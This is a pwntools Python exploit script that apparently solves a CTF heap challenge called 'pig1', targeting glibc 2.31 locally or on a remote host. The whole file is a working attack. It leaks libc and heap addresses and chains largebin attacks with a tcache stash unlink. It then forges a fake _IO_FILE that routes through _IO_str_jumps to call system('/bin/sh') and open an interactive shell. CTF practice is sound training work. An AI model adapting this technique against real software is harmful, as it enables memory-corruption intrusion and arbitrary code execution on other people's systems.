#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pig1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.31.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Choice: ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('sage size: ')
    p.sendline(str(size))
    p.recvuntil("'s message: ")
    p.send(con)

def show(idx):
    eat()
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def edit(idx, con):
    eat()
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil("'s message: ")
    p.send(con)

def dele(idx):
    eat()
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def change(user):
    eat()
    p.sendline('5')
    if user == 1:
        p.recvuntil('user:\n')
        p.sendline('\x41\x01\x95\xC9\x1C')
    elif user == 2:
        p.recvuntil('user:\n')
        p.sendline('\x42\x01\x87\xC3\x19')
    elif user == 3:
        p.recvuntil('user:\n')
        p.sendline('\x43\x01\xF7\x3C\x32')

change(2)
for i in range(5):
    add(0x90,'tcache size\n' * (0x90 // 48))
    dele(i)
change(1)
for i in range(7):
    add(0x150,'tcache size\n' * (0x150 // 48))
    dele(i)
add(0x150,'to unsorted\n' * (0x150 // 48)) # 7*
add(0x150,'to unsorted\n' * (0x150 // 48)) # 8
dele(7)
change(2)
add(0xB0,'split7\n' * (0xB0 // 48)) # 5

change(1)
add(0x150,'to unsorted\n' * (0x150 // 48)) # 9*
add(0x150,'to unsorted\n' * (0x150 // 48)) # 10
dele(9)


change(2)
add(0xB0,'split9\n' * (0xB0 // 48)) # 6

# prepare done
change(1)
add(0x410,'leak_libc\n' * (0x410 // 48)) # 11
add(0x410,'largebin\n' * (0x410 // 48)) # 12
add(0x410,'\n' * (0x410 // 48)) # 13
dele(12)

change(2)
change(1)
show(12)
p.recvuntil("is: ")
libc_base = u64(p.recv(6).ljust(8,b'\x00')) - libc.sym["__malloc_hook"] - 0x10 - 96
show(5)
p.recvuntil("is: ")
heap_base = u64(p.recv(6).ljust(8,b'\x00')) - 0x12750
log.success("libc_base: " + hex(libc_base))
log.success("heap_base: " + hex(heap_base))
__free_hook_addr = libc_base + libc.sym["__free_hook"]
_IO_list_all_addr = libc_base + libc.sym["_IO_list_all"]
#_IO_str_jump_addr = libc_base + libc.sym["_IO_str_jump"]
_IO_str_jump_addr = libc_base + 0x1ED560
system_addr = libc_base + libc.sym["system"]
############################### leak done ###############################

add(0x410,'get back\n' * (0x410 // 48)) # 14

change(2)
add(0x420,'larbigen\n' * (0x420 // 48)) # 7
add(0x430,'largebin\n' * (0x430 // 48)) # 8
dele(7)
add(0x430,'push\n' * (0x430 // 48)) # 9
change(1)
change(2)
edit(7,(p64(0) + p64(__free_hook_addr - 0x28)) * (0x420//48))
log.success("__free_hook_addr - 0x28: " + hex(__free_hook_addr - 0x28))
change(1)
dele(14)
add(0x430,'push\n' * (0x430 // 48)) # 15
# largebin attack done

change(3)

add(0x410,'get_back\n' * (0x430 // 48)) # 0

change(1)

edit(9,(p64(heap_base + 0x12C20) + p64(__free_hook_addr - 0x20)) * (0x150 // 48))

change(3)


add(0x90,'do stash\n' * (0x90 // 48)) # 1

# stash unlink done
change(2)

edit(7,(p64(0) + p64(_IO_list_all_addr - 0x20)) * (0x420//48))

change(3)

dele(0)

add(0x430,'push\n' * (0x430 // 48)) # 2

# second largebin atk
change(3)

add(0x330,'pass\n' * (0x430 // 48)) # 3

add(0x430,'pass\n' * (0x430 // 48)) # 4

fake_IO_FILE = b''
fake_IO_FILE += 2 * p64(0)
fake_IO_FILE += p64(1) # _IO_write_base
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(heap_base + 0x13E20) # old_buf, _IO_buf_base
fake_IO_FILE += p64(heap_base + 0x13E20 + 0x18) # calc the memcpy length, _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xC0 - 0x10,b'\x00')
fake_IO_FILE += p32(0) # mode <= 0
fake_IO_FILE += p32(0) + p64(0) * 2 # bypass _unused2
fake_IO_FILE += p64(_IO_str_jump_addr)
payload = fake_IO_FILE + b'/bin/sh\x00' + 2 * p64(system_addr)
p.sendlineafter("01dwang's Gift:\n",payload)

#add_message(0x410,'large_bin\n' * (0x410 // 48)) # 1
p.sendlineafter("Choice: ",'5')
p.sendlineafter("user:\n",'')

p.interactive()
